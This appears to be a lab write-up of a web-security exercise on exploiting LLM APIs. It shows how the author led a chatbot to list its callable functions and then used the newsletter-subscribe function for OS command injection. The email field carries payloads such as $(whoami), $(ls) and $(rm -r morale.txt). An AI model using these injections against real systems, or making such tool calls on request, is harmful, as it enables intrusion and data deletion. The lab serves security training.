@@ -1,0 +1,19 @@
+Lab: Exploiting vulnerabilities in LLM APIs
+Task: Vulnerable to OS command injection that can be exploited via API.
+    - Delete morale.txt file.
+
+Analysis:
+(1) Ask for APIs
+    1. `functions.password_reset`: This function requests a password reset for a user by providing their username or email.
+    2. `functions.subscribe_to_newsletter`: This function subscribes a user to the newsletter by providing their email address.
+    3. `functions.product_info`: This function returns information about the products sold by providing the exact name or ID of the product.        
+
+(2) Use functions.subscribe_to_newsletter as we don't have account login we cannot use functions.password_reset.
+(3) Ask for arguments
+    -> The `subscribe_to_newsletter` function requires an `email` parameter, which should be a string.
+(4) Call API function using 
+    1. attacker@exploit-0a78002b045fa1078032c51d01b10010.exploit-server.net
+    2. $(whoami) @exploit-0a78002b045fa1078032c51d01b10010.exploit-server.net
+        -> carlos user
+    3. $(ls) @exploit-0a78002b045fa1078032c51d01b10010.exploit-server.net
+    4. $(rm -r morale.txt) @exploit-0a78002b045fa1078032c51d01b10010.exploit-server.net
